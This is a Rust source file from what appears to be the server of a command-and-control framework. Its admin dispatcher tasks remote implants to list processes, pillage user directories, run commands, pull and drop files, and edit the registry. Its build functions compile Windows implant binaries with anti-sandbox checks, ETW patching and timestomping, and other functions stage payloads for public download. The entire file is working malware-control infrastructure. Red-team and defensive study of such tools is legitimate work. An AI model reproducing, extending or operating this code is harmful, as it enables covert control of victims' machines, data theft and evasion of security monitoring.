use std::{
    env::current_dir,
    fs::create_dir_all,
    io,
    path::{Path, PathBuf},
    sync::Arc,
};

use crate::{
    DB_EXPORT_PATH, FILE_STORE_PATH,
    app_state::{AppState, DownloadEndpointData},
    logging::{log_error, log_error_async},
    profiles::get_profile,
    timestomping::timestomp_binary_compile_date,
};
use axum::extract::State;
use chrono::{SecondsFormat, Utc};
use serde_json::Value;
use shared::{
    pretty_print::print_failed,
    task_types::BuildAllBins,
    tasks::{
        AdminCommand, Command, DELIM_FILE_DROP_METADATA, FileDropMetadata,
        FileUploadStagingFromClient, NewAgentStaging, StageType, WyrmResult,
    },
};
use shared_c2_client::{AgentC2MemoryNotifications, MapToMitre, TaskExport};
use tokio::{
    fs,
    io::{AsyncReadExt, AsyncWriteExt},
};

/// Main dispatcher for admin commands issued on the server, which may, or may not, include an
/// implant UID.
pub async fn admin_dispatch(
    uid: Option<String>,
    command: AdminCommand,
    state: State<Arc<AppState>>,
) -> Vec<u8> {
    // Note, due to the use of generics with the function `task_agent`, if you are passing `None`
    // into the function, you will have to turbofish a type which does implement ToString - so,
    // to keep it simple, just turbofish String - it will be discarded as the `None` path will be
    // taken
    let result: Option<Value> = match command {
        AdminCommand::Sleep(time) => task_agent_sleep(time, uid.unwrap(), state).await,
        AdminCommand::ListAgents => list_agents(state).await,
        AdminCommand::ListProcesses => {
            task_agent::<String>(Command::Ps, None, uid.unwrap(), state).await
        }
        AdminCommand::GetUsername => todo!(),
        AdminCommand::ListUsersDirs => {
            task_agent::<String>(Command::Pillage, None, uid.unwrap(), state).await
        }
        AdminCommand::Pwd => task_agent::<String>(Command::Pwd, None, uid.unwrap(), state).await,
        AdminCommand::Cd(path_buf) => {
            task_agent(Command::Cd, Some(path_buf), uid.unwrap(), state).await
        }
        AdminCommand::KillAgent => {
            task_agent::<String>(Command::KillAgent, None, uid.unwrap(), state).await
        }
        AdminCommand::Ls => task_agent::<String>(Command::Ls, None, uid.unwrap(), state).await,
        AdminCommand::ShowServerTime => show_server_time(),
        AdminCommand::Login => Some(serde_json::to_value("success").unwrap()),
        AdminCommand::ListStagedResources => list_staged_resources(state).await,
        AdminCommand::Run(args) => task_agent(Command::Run, Some(args), uid.unwrap(), state).await,
        AdminCommand::DeleteStagedResource(download_endpoint) => {
            delete_staged_resources(state, download_endpoint).await
        }
        AdminCommand::RemoveAgentFromList => remove_agent_from_list(state, uid.unwrap()).await,
        AdminCommand::Undefined => panic!("This should never happen."),
        AdminCommand::StageFileOnC2(metadata) => {
            stage_file_upload_from_users_disk(metadata, state).await
        }
        AdminCommand::KillProcessById(pid) => {
            task_agent::<String>(Command::KillProcess, Some(pid), uid.unwrap(), state).await
        }
        AdminCommand::Drop(data) => drop_file_handler(uid, data, state).await,
        AdminCommand::Copy(inner) => {
            // Serialise the (String, String) to just a String so we can use it with the
            // generic task_agent.
            let inner_serialised = match serde_json::to_string(&inner) {
                Ok(s) => Some(s),
                Err(e) => {
                    log_error_async(&e.to_string()).await;
                    None
                }
            };

            if inner_serialised.is_some() {
                task_agent::<String>(Command::Copy, inner_serialised, uid.unwrap(), state).await
            } else {
                None
            }
        }
        AdminCommand::Move(inner) => {
            // Serialise the (String, String) to just a String so we can use it with the
            // generic task_agent.
            let inner_serialised = match serde_json::to_string(&inner) {
                Ok(s) => Some(s),
                Err(e) => {
                    log_error_async(&e.to_string()).await;
                    None
                }
            };

            if inner_serialised.is_some() {
                task_agent::<String>(Command::Move, inner_serialised, uid.unwrap(), state).await
            } else {
                // Error logged in above failure path
                None
            }
        }
        AdminCommand::Pull(file_path) => {
            task_agent(Command::Pull, Some(file_path), uid.unwrap(), state).await
        }
        AdminCommand::BuildAllBins(_) => None,
        AdminCommand::RegQuery(data) => match serde_json::to_string(&data) {
            Ok(s) => task_agent(Command::RegQuery, Some(s), uid.unwrap(), state).await,
            Err(e) => {
                log_error_async(&e.to_string()).await;
                None
            }
        },
        AdminCommand::RegAdd(data) => match serde_json::to_string(&data) {
            Ok(s) => task_agent(Command::RegAdd, Some(s), uid.unwrap(), state).await,
            Err(e) => {
                log_error_async(&e.to_string()).await;
                None
            }
        },
        AdminCommand::RegDelete(data) => match serde_json::to_string(&data) {
            Ok(s) => task_agent(Command::RegDelete, Some(s), uid.unwrap(), state).await,
            Err(e) => {
                log_error_async(&e.to_string()).await;
                None
            }
        },
        AdminCommand::RmFile(data) => match serde_json::to_string(&data) {
            Ok(s) => task_agent(Command::RmFile, Some(s), uid.unwrap(), state).await,
            Err(e) => {
                log_error_async(&e.to_string()).await;
                None
            }
        },
        AdminCommand::RmDir(data) => match serde_json::to_string(&data) {
            Ok(s) => task_agent(Command::RmDir, Some(s), uid.unwrap(), state).await,
            Err(e) => {
                log_error_async(&e.to_string()).await;
                None
            }
        },
        AdminCommand::ExportDb => export_completed_tasks_to_json(uid.unwrap(), state).await,
        AdminCommand::None => None,
    };

    serde_json::to_vec(&result).unwrap()
}

/// Builds all binaries from a given profile
///
/// On success, this function returns None, otherwise an Error is encoded within a `Value` as a `WyrmResult`
pub async fn build_all_bins(
    bab: BuildAllBins,
    state: State<Arc<AppState>>,
) -> Result<Vec<u8>, String> {
    // Save into tmp within profiles, we will delete it on completion.
    let save_path = PathBuf::from("./profiles/tmp");
    let profile_name = bab.0;

    if let Err(e) = create_dir_all(&save_path) {
        let msg = format!(
            "Failed to create tmp directory on c2 for profile staging. {}",
            e.kind()
        );
        log_error_async(&msg).await;
        return Err(msg);
    };

    //
    // Read the profile from disk
    //

    let profile = match get_profile(&profile_name).await {
        Ok(p) => p,
        Err(e) => {
            let msg = format!("Error reading profile: {profile_name}. {e:?}");
            log_error_async(&msg).await;
            let _ = remove_dir(&save_path).await?;
            return Err(msg);
        }
    };

    let listener_profile_name = &bab.2.unwrap_or("default".into());
    let implant_profile_name = &bab.3.unwrap_or("default".into());

    //
    // Transform the profile into a valid `NewAgentStaging`
    //
    let data = match profile.as_staged_agent(
        listener_profile_name,
        implant_profile_name,
        StageType::All,
    ) {
        WyrmResult::Ok(d) => d,
        WyrmResult::Err(e) => {
            let msg = format!("Error constructing a NewAgentStaging: {profile_name}. {e:?}");
            log_error_async(&msg).await;
            let _ = remove_dir(&save_path).await?;
            return Err(msg);
        }
    };

    //
    // For every build type, build it - we manually specify the loop size here so as more
    // build options are added, the loop will need to be increased to accommodate.
    //
    for i in 0..2 {
        let stage_type = match i {
            0 => StageType::Exe,
            1 => StageType::Dll,
            _ => unreachable!(),
        };

        // Actually try build with cargo
        let cmd_build_output = build_agent(&data, stage_type).await;

        if let Err(e) = cmd_build_output {
            let msg = &format!("Failed to build agent. {e}");
            log_error_async(msg).await;
            let _ = stage_new_agent_error_printer(msg, &data.staging_endpoint, state).await;
            let _ = remove_dir(&save_path).await?;
            return Err(msg.to_owned());
        }

        let output = cmd_build_output.unwrap();
        if !output.status.success() {
            let msg = &format!(
                "Failed to build agent. {:#?}",
                String::from_utf8_lossy(&output.stderr),
            );
            log_error_async(msg).await;

            let _ = stage_new_agent_error_printer(msg, &data.staging_endpoint, state).await;
            let _ = remove_dir(&save_path).await?;

            return Err(msg.to_owned());
        }

        //
        // Move the built implant to where the operator requested it to be built in
        //
        let dir_name = {
            match data.build_debug {
                true => "debug",
                false => "release",
            }
        };

        let src_dir = if cfg!(windows) {
            PathBuf::from(format!("./implant/target/{dir_name}"))
        } else {
            PathBuf::from(format!(
                "./implant/target/x86_64-pc-windows-msvc/{dir_name}"
            ))
        };

        let out_dir = Path::new(&save_path);
        let src = match stage_type {
            StageType::Dll => src_dir.join("implant.dll"),
            StageType::Exe => src_dir.join("implant.exe"),
            StageType::All => unreachable!(),
        };

        let mut dest = out_dir.join(&data.pe_name);

        if !(match stage_type {
            StageType::Dll => dest.add_extension("dll"),
            StageType::Exe => dest.add_extension("exe"),
            StageType::All => unreachable!(),
        }) {
            let msg = format!("Failed to add extension to local file. {dest:?}");
            log_error_async(&msg).await;
            let _ = remove_dir(&save_path).await?;

            return Err(msg);
        };

        // Error check..
        if let Err(e) = tokio::fs::rename(&src, &dest).await {
            let cwd = current_dir().expect("could not get cwd");
            let msg = format!(
                "Failed to rename built agent, looking for: {}, to rename to: {}. Cwd: {cwd:?} {e}",
                src.display(),
                dest.display()
            );
            let _ = stage_new_agent_error_printer(&msg, &data.staging_endpoint, state).await;
            let _ = remove_dir(&save_path).await?;

            return Err(msg);
        };

        //
        // Update state to include a new endpoint for the listeners
        //
        if let Err(e) = is_download_staging_url_error(&data, &state).await {
            let msg = format!(
                "The download URL matches an existing one, or a URL which is used for agent check-in, \
                this is not permitted. Kind: {e:?}"
            );
            let _ = stage_new_agent_error_printer(&msg, &data.staging_endpoint, state).await;
            let _ = remove_dir(&save_path).await?;

            return Err(msg);
        }

        //
        // If the user profile specifies to timestomp the binary, then try do that - if it fails we do not want to allow
        // the bad file to be returned to the user.
        //
        if let Some(ts) = data.timestomp.as_ref() {
            if let Err(e) = timestomp_binary_compile_date(ts, &dest).await {
                let msg = format!("Could not timestomp binary {}, {e}", dest.display());
                let _ = stage_new_agent_error_printer(&msg, &data.staging_endpoint, state).await;
                let _ = remove_dir(&save_path).await?;

                return Err(msg);
            }
        }
    }

    const ZIP_OUTPUT_PATH: &str = "./profiles/tmp.7z";
    let mut cmd = tokio::process::Command::new("7z");
    cmd.args([
        "a",
        ZIP_OUTPUT_PATH,
        &format!("{}", save_path.as_os_str().display()),
    ]);

    if let Err(e) = cmd.output().await {
        let msg = format!("Error creating 7z archive with resulting payloads. {e}");
        let _ = stage_new_agent_error_printer(&msg, &data.staging_endpoint, state).await;
        print_failed(&msg);
        let _ = remove_dir(&save_path).await?;

        return Err(msg);
    };

    //
    // At this point, we have created the 7z. We now want to read it into a buffer in memory,
    // delete the archive, then return the buffer back to the user. We will send it through as a
    // byte stream, which the client can then re-interpret as a file download.
    //
    let _ = remove_dir(&save_path).await?;

    let mut buf = Vec::new();
    let mut file = match tokio::fs::File::open(ZIP_OUTPUT_PATH).await {
        Ok(f) => f,
        Err(e) => {
            let msg = format!("Error opening 7z file. {e}");
            let _ = stage_new_agent_error_printer(&msg, &data.staging_endpoint, state).await;
            print_failed(&msg);
            let _ = remove_dir(&save_path).await?;

            return Err(msg);
        }
    };

    if let Err(e) = file.read_to_end(&mut buf).await {
        let msg = format!("Error reading 7z file. {e}");
        let _ = stage_new_agent_error_printer(&msg, &data.staging_endpoint, state).await;
        print_failed(&msg);
        let _ = remove_dir(&save_path).await?;

        return Err(msg);
    }

    remove_file(ZIP_OUTPUT_PATH).await?;

    Ok(buf)
}

async fn remove_dir(save_path: impl AsRef<Path>) -> Result<(), String> {
    if let Err(e) = fs::remove_dir_all(save_path).await {
        let msg = format!("Failed to remove directory for tmp after building profiles. {e}");
        log_error_async(&msg).await;
        return Err(msg);
    }

    Ok(())
}

async fn remove_file(file_path: impl AsRef<Path>) -> Result<(), String> {
    if let Err(e) = fs::remove_file(file_path.as_ref()).await {
        let msg = format!("Failed to remove file for tmp.7z after building profiles. {e}");
        log_error_async(&msg).await;
        return Err(msg);
    }

    Ok(())
}

async fn list_agents(state: State<Arc<AppState>>) -> Option<Value> {
    let agents = state.connected_agents.list_agents();

    let mut new_agents: Vec<AgentC2MemoryNotifications> = Vec::new();

    let mut maybe_entry = agents.first_entry_async().await;
    while let Some(row) = maybe_entry {
        let agent = row.read().await;

        // time formatting
        let last_check_in = agent
            .last_checkin_time
            .to_rfc3339_opts(chrono::SecondsFormat::Secs, true);

        // The string we will send back representing the individual agent
        let formatted = format!(
            "\t{}\t\t{}\t{}\t{}",
            agent.uid, last_check_in, agent.first_run_data.b, agent.first_run_data.c,
        );

        let new_messages = pull_notifications_for_agent(agent.uid.clone(), state.clone()).await;

        new_agents.push((formatted, agent.is_stale, new_messages));

        drop(agent);
        maybe_entry = row.next_async().await;
    }

    Some(serde_json::to_value(&new_agents).expect("could not serialise"))
}

/// Inserts a new task for the agent where the format of the task metadata is already valid. This function is
/// just a wrapper for a database interaction.
///
/// # Returns
/// None - the task is queued and the resulting data can be made available with the 'n' function on the cli.
async fn task_agent<T: Into<String>>(
    command: Command,
    metadata: Option<T>,
    uid: String,
    state: State<Arc<AppState>>,
) -> Option<Value> {
    let metadata = metadata.map(|t| t.into());

    state
        .db_pool
        .add_task_for_agent_by_id(&uid, command, metadata)
        .await
        .unwrap();

    None
}

/// Inserts a new task in the db instructing the agent to alter its sleep time. This will also be reflected in the
/// agent's metadata on the agent db entry for persistence.
async fn task_agent_sleep(time: i64, uid: String, state: State<Arc<AppState>>) -> Option<Value> {
    let time_as_str = time.to_string();
    state
        .db_pool
        .update_agent_sleep_time(&uid, time)
        .await
        .unwrap();

    state
        .db_pool
        .add_task_for_agent_by_id(&uid, Command::Sleep, Some(time_as_str))
        .await
        .unwrap();

    // We dont have any metadata to send back to the client, so an empty vec is sufficient
    None
}

/// Queries the database for the pending notifications for a given agent, and then marks them as pulled.
async fn pull_notifications_for_agent(uid: String, state: State<Arc<AppState>>) -> Option<Value> {
    // Used to store the completed ID's we took from the DB to mark them as
    // pulled.
    let mut ids = Vec::new();

    let agent_notifications = match state.db_pool.pull_notifications_for_agent(&uid).await {
        Ok(inner) => {
            let inner = inner.map(|t| {
                t.iter().for_each(|n| ids.push(n.completed_id));
                serde_json::to_value(&t).unwrap()
            });
            if inner.is_none() {
                return inner;
            } else {
                inner
            }
        }
        Err(e) => {
            panic!("Could not pull notifications for agent {uid}. {e}");
        }
    };

    // At this point the notifications have been pulled, but they are still set in teh database.
    // So we need to set them as pulled so we don't duplicate tasking.

    // assert_eq!(ids.is_empty(), false);

    state
        .db_pool
        .mark_agent_notification_completed(&ids)
        .await
        .unwrap();

    agent_notifications
}

/// Returns the time of the server in UTC
fn show_server_time() -> Option<Value> {
    let time_now = Utc::now();
    let time_now_snipped = time_now.to_rfc3339_opts(SecondsFormat::Secs, true);

    match serde_json::to_value(&time_now_snipped) {
        Ok(time) => Some(time),
        Err(e) => {
            let s = format!("Failed to serialise server time. {e}");
            Some(serde_json::to_value(&s).unwrap())
        }
    }
}

/// Stages a file uploaded to the C2 by an admin which will be made available for public download
/// at a specified API endpoint.
async fn stage_file_upload_from_users_disk(
    data: FileUploadStagingFromClient,
    state: State<Arc<AppState>>,
) -> Option<Value> {
    let out_dir = Path::new(FILE_STORE_PATH);
    let dest = out_dir.join(&data.download_name);

    // Write to disk
    if let Err(e) = fs::write(&dest, &data.file_data).await {
        let serialised = serde_json::to_value(WyrmResult::Err::<String>(format!(
            "Failed to write file on C2: {e:?}",
        )))
        .unwrap();

        return Some(serialised);
    }

    //
    // We can reuse the db function to stage a new agent, except we are serving our download instead.
    // To make this work we just need to fudge a few fields which aren't needed, but it allows for
    // database compliancy without addition additional logic, which in turn will also affect that process.
    // todo this should probably be a `NewAgentStaging::from_x`
    //
    let agent_stage_template = NewAgentStaging {
        implant_name: "-".into(),
        default_sleep_time: 0,
        c2_address: "-".into(),
        c2_endpoints: vec!["-".into()],
        staging_endpoint: data.api_endpoint.clone(),
        pe_name: data.download_name.clone(),
        port: 1,
        agent_security_token: "-".into(),
        antisandbox_trig: false,
        antisandbox_ram: false,
        stage_type: shared::tasks::StageType::Exe,
        build_debug: false,
        useragent: "".into(),
        patch_etw: false,
        jitter: None,
        timestomp: None,
    };

    //
    // Try insert into the database, following that, deconflict the download URI and add it into the in-memory
    // list.
    //
    if let Err(e) = state.db_pool.add_staged_agent(&agent_stage_template).await {
        log_error_async(&format!("Failed to insert row in db: {e:?}")).await;
        let serialised = serde_json::to_value(WyrmResult::Err::<String>(format!(
            "Failed to insert row in db for new staged agent: {e:?}",
        )))
        .unwrap();

        return Some(serialised);
    };

    // If we receive an error whilst trying to upload the staged data, return an error.
    if let Err(e) = add_api_endpoint_for_staged_resource(&agent_stage_template, state.clone()).await
    {
        return stage_new_agent_error_printer(
            &format!(
                "The download URL matches an existing one, or a URL which is used for agent \
                check-in, this is not permitted. Kind: {e:?}"
            ),
            &data.download_name,
            state,
        )
        .await;
    };

    let serialised = match serde_json::to_value(WyrmResult::Ok(format!(
        "File successfully uploaded, and is being served at /{}. File name: {}",
        data.api_endpoint, data.download_name,
    ))) {
        Ok(s) => s,
        Err(e) => {
            return stage_new_agent_error_printer(
                &format!("Failed to serialise response. {e}"),
                &data.download_name,
                state,
            )
            .await;
        }
    };

    Some(serialised)
}

/// Validates the extension of the build target matches that expected by the operator
/// after building takes place.
fn validate_extension(name: &String, expected_type: StageType) -> String {
    let mut new_name = String::from(name);

    match expected_type {
        StageType::Dll => {
            if !new_name.ends_with(".dll") && (name.ends_with(".exe") || name.ends_with(".svc")) {
                let _ = new_name.replace(".exe", "");
                let _ = new_name.replace(".svc", "");
                new_name.push_str(".dll");
            } else {
                new_name.push_str(".dll");
            }
        }
        StageType::Exe => {
            if !new_name.ends_with(".exe") && (name.ends_with(".dll") || name.ends_with(".svc")) {
                let _ = new_name.replace(".dll", "");
                let _ = new_name.replace(".svc", "");
                new_name.push_str(".exe");
            } else {
                new_name.push_str(".exe");
            }
        }
        StageType::All => unreachable!(),
    }

    new_name
}

/// Builds the specified agent as a PE.
///
/// # Important
/// The PE name passed into this function should NOT include its extension.
async fn build_agent(
    data: &NewAgentStaging,
    stage_type: StageType,
) -> Result<std::process::Output, std::io::Error> {
    //
    // Try insert the data into the db. We have some constraints on the db so that it cannot stage
    // at duplicate endpoints, or with duplicate names, etc.
    //

    if stage_type == StageType::All {
        return Err(io::Error::other("StageType::All not supported"));
    }

    let pe_name = validate_extension(&data.pe_name, stage_type);

    // Check for any feature flags
    let features: Vec<String> = if data.antisandbox_ram || data.antisandbox_trig {
        let mut builder = vec!["--features".to_string()];
        let mut string_builder = String::new();

        if data.antisandbox_ram {
            string_builder.push_str("sandbox_mem,");
        }
        if data.antisandbox_trig {
            string_builder.push_str("sandbox_trig,");
        }
        if data.patch_etw {
            string_builder.push_str("patch_etw,");
        }

        builder.push(string_builder);

        builder
    } else {
        vec![]
    };

    let build_as_flags = match stage_type {
        shared::tasks::StageType::Dll => vec!["--lib"],
        shared::tasks::StageType::Exe => vec!["--bin", "implant"],
        StageType::All => vec![],
    };

    //
    // Now we want to actually build the agent itself. We will do this on the C2, building the
    // agent via the local command shell.
    //
    // As operators shouldn't be doing this frequently, I can't see much harm in terms of CPU and
    // memory, but this may need to be profiled.
    //
    // We are also relying on the C2 being run from the correct point as pathing here is going to be
    // relative to allow flexibility on server installations. The C2 must run from the c2 crate directly
    // for the pathing to work.
    //

    let toolchain = "nightly";
    let target = if cfg!(windows) {
        None
    } else {
        Some("x86_64-pc-windows-msvc")
    };

    let mut cmd = if !cfg!(windows) {
        tokio::process::Command::new("cargo-xwin")
    } else {
        tokio::process::Command::new("cargo")
    };

    let c2_endpoints = data
        .c2_endpoints
        .iter()
        .map(|e| e.to_string() + ",")
        .collect::<String>();

    let jitter = data.jitter.unwrap_or_default();

    cmd.env("RUSTUP_TOOLCHAIN", toolchain)
        .current_dir("./implant")
        .env("AGENT_NAME", &data.implant_name)
        .env("PE_NAME", pe_name)
        .env("DEF_SLEEP_TIME", data.default_sleep_time.to_string())
        .env("C2_HOST", &data.c2_address)
        .env("C2_URIS", c2_endpoints)
        .env("C2_PORT", data.port.to_string())
        .env("JITTER", jitter.to_string())
        .env("USERAGENT", &data.useragent)
        .env("STAGING_URI", &data.staging_endpoint)
        .env("SECURITY_TOKEN", &data.agent_security_token);

    cmd.arg("build");

    if let Some(t) = target {
        cmd.args(["--target", t]);
    }

    if !data.build_debug {
        cmd.arg("--release");
    }

    cmd.args(build_as_flags).args(features);

    cmd.output().await
}

/// Prints an error to the C2 console and returns a formatted error.
///
/// **IMPORTANT**: This function will also delete the staged_agent row from the database by it's `implant_name`.
async fn stage_new_agent_error_printer(
    message: &str,
    uri: &str,
    state: State<Arc<AppState>>,
) -> Option<Value> {
    log_error_async(message).await;
    let _ = state.db_pool.delete_staged_resource_by_uri(uri).await;

    let serialised = serde_json::to_value(WyrmResult::Err::<String>(message.to_string())).unwrap();

    Some(serialised)
}

/// Lists staged resources on the C2, such as staged agents
async fn list_staged_resources(state: State<Arc<AppState>>) -> Option<Value> {
    let results = match state.db_pool.get_staged_agent_data().await {
        Ok(r) => WyrmResult::Ok(r),
        Err(e) => {
            log_error_async(&format!("Failed to list resources: {e:?}")).await;
            WyrmResult::Err(e.to_string())
        }
    };

    let ser = serde_json::to_value(results).unwrap();

    Some(ser)
}

/// Deletes a staged resource from the database by its internal stage name
async fn delete_staged_resources(
    state: State<Arc<AppState>>,
    download_endpoint: String,
) -> Option<Value> {
    // Delete from db
    let results = state
        .db_pool
        .delete_staged_resource_by_uri(&download_endpoint)
        .await
        .unwrap();

    {
        // remove the download stage from the in memory list
        let mut lock = state.endpoints.write().await;
        lock.download_endpoints.remove(&download_endpoint);
    }

    // Delete from disk
    let mut file_to_delete = PathBuf::from(FILE_STORE_PATH);
    file_to_delete.push(results);
    tokio::fs::remove_file(&file_to_delete).await.unwrap();

    let ser = serde_json::to_value(()).unwrap();

    Some(ser)
}

async fn remove_agent_from_list(state: State<Arc<AppState>>, agent_name: String) -> Option<Value> {
    state.connected_agents.remove_agent(&agent_name).await;

    None
}

/// Error state which could occur when trying to add a stage or file to the C2
#[derive(Debug)]
enum StageError {
    EndpointExistsDownload,
    EndpointExistsCheckIn,
}

/// Adds an API endpoint for public use on the C2 which relates to a custom file / a new agent uploaded
/// by the admin on the client.
///
/// The function handles errors and deconflictions, ensuring that we do not cause any duplication. If no errors are
/// encountered, it will insert the relevant data into the in-memory structures.
///
/// This function does **not** handle database insertions, and assumes they have already been done / will be done
/// hereafter.
///
/// # Returns
/// - `Ok`: If successful, unit Ok is returned
/// - `Err`: If there is an error adding a URI, the error is returned as a [`StageError`]
async fn add_api_endpoint_for_staged_resource(
    data: &NewAgentStaging,
    state: State<Arc<AppState>>,
) -> Result<(), StageError> {
    // Check we dont overlap incompatible URI's
    is_download_staging_url_error(data, &state).await?;

    let mut server_endpoints = state.endpoints.write().await;

    server_endpoints.download_endpoints.insert(
        data.staging_endpoint.clone(),
        DownloadEndpointData::new(&data.pe_name, &data.implant_name, None),
    );

    Ok(())
}

/// Checks whether a staged URI exists in a way which is incompatible. For example, you cannot have two
/// download URI's that overlap, and you cannot have a checkin URI overlapping with a download URI.
async fn is_download_staging_url_error(
    data: &NewAgentStaging,
    state: &State<Arc<AppState>>,
) -> Result<(), StageError> {
    //
    // Check for conflicts with download and staging API's, that is what we look for in the first
    // three vars, `c2_conflicts_download`, `staging_conflicts_c2` & `staging_conflicts_self`
    //
    let server_endpoints = state.endpoints.read().await;
    for e in &data.c2_endpoints {
        if server_endpoints.download_endpoints.contains_key(e) == true {
            return Err(StageError::EndpointExistsDownload);
        }
    }

    // Check the existing C2 endpoints with the proposed staging endpoint (only in the case
    // where the operator is building manually as opposed to the profile). Building via the profile
    // currently results in a empty string "", which is why we do this check.
    if !data.staging_endpoint.is_empty()
        && server_endpoints
            .c2_endpoints
            .contains(&data.staging_endpoint)
    {
        return Err(StageError::EndpointExistsCheckIn);
    }

    if server_endpoints
        .download_endpoints
        .contains_key(&data.staging_endpoint)
    {
        return Err(StageError::EndpointExistsDownload);
    }

    Ok(())
}

/// Handler for instructing the agent to drop a file to disk.
async fn drop_file_handler(
    uid: Option<String>,
    mut data: FileDropMetadata,
    state: State<Arc<AppState>>,
) -> Option<Value> {
    // check we dont have the delimiter in the input
    if data.download_name.contains(DELIM_FILE_DROP_METADATA)
        || data.internal_name.contains(DELIM_FILE_DROP_METADATA)
        || data
            .download_uri
            .as_deref()
            .unwrap_or_default()
            .contains(DELIM_FILE_DROP_METADATA)
    {
        return Some(
            serde_json::to_value(WyrmResult::Err::<String>(format!(
                "Content cannot contain {DELIM_FILE_DROP_METADATA}"
            )))
            .unwrap(),
        );
    }

    //
    // Check whether we actually have that file available on the server.
    // If we do not have the file, we want to return `None` as to not task the agent with downloading a file that doesn't
    // exist. An error message will appear in the server error log.
    //
    let mut found = false;
    {
        let lock = state.endpoints.read().await;

        for row in lock.download_endpoints.iter() {
            if row.1.internal_name.eq(&data.internal_name) {
                found = true;
                // The URI doesn't include the leading /, so we add it here
                data.download_uri = Some(format!("/{}", row.0));
                break;
            }
        }
    }

    if !found {
        let msg = format!(
            "Could not find staged file when instructing agent to drop a file to disk. Looking for file name: '{}' \
            but it does not exist in memory.",
            data.internal_name
        );
        log_error_async(&msg).await;
        return Some(serde_json::to_value(WyrmResult::Err::<String>(msg)).unwrap());
    }

    task_agent::<String>(Command::Drop, Some(data.into()), uid.unwrap(), state).await
}

/// Exports the completed tasks on an agent (by its ID) to a json file in the C2 filesystem
async fn export_completed_tasks_to_json(uid: String, state: State<Arc<AppState>>) -> Option<Value> {
    //
    // This whole block here just unwraps explicitly twice safely through matches trying to get the inner
    // data. If there was an error or there was no data, this is handled and the function will immediately
    // return. Using thiserror or using maps may be a little nicer...
    //
    let results = match state.db_pool.get_agent_export_data(uid.as_str()).await {
        Ok(r) => match r {
            Some(r) => {
                if r.is_empty() {
                    let msg = format!("Tasks for implant: {uid} were empty");
                    log_error(&msg);
                    return Some(serde_json::to_value(msg).unwrap());
                }

                r
            }
            None => {
                let msg = format!("Tasks for implant: {uid} were empty");
                log_error(&msg);
                return Some(serde_json::to_value(msg).unwrap());
            }
        },
        Err(e) => {
            let msg = format!(
                "Error encountered for implant: {uid} when trying to fetch completed tasks. {e}"
            );
            log_error(&msg);
            return Some(serde_json::to_value(msg).unwrap());
        }
    };

    // Serialise
    let mut results_with_mitre: Vec<TaskExport> = Vec::with_capacity(results.len());

    for task in &results {
        results_with_mitre.push(TaskExport::new(task, task.command.map_to_mitre()));
    }

    let json_export = serde_json::to_string(&results_with_mitre)
        .map_err(|e| {
            let msg = format!("Could not serialise db results for agent: {uid}. {e}");
            log_error(&msg);

            Some(serde_json::to_value(msg).unwrap())
        })
        .unwrap();

    //
    // Try write the data to the fs
    //
    let mut path = PathBuf::from(DB_EXPORT_PATH);
    path.push(&uid);
    path.add_extension("json");

    let mut file = tokio::fs::OpenOptions::new()
        .write(true)
        .read(true)
        .create(true)
        .truncate(true)
        .open(&path)
        .await
        .map_err(|e| {
            let msg = format!(
                "Could not create db export file on fs for agent: {uid}. Path: {}, {e}",
                path.display()
            );
            log_error(&msg);
            Some(serde_json::to_value(msg).unwrap())
        })
        .unwrap();

    if let Err(e) = file.write(json_export.as_bytes()).await {
        log_error(&format!(
            "Could not write to output file {} for agent: {uid}. {e}",
            path.display()
        ));
        return None;
    };

    Some(serde_json::to_value(format!("File exported as {uid}")).unwrap())
}
